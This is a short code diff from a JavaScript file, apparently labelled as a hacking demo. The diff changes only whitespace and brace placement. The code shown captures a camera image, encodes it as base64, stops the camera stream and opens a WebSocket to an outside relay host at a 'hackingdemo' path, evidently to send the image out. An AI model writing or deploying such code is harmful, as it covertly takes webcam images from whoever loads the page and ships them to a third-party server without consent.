@@ -18,12 +18,12 @@
             callback(base64data);
             stream.getTracks().forEach(track => track.stop());
           };
-      } catch (error) {
+        } catch (error) {
         console.error('Error accessing camera:', error);
+        }
       }
-    }
       function main() {
-	      captureImage((base64Image) => {
+	  captureImage((base64Image) => {
           const socket = new WebSocket('wss://cloud.achex.ca/hackingdemo');
           socket.addEventListener('open', function (event) {
             console.log('open',event)
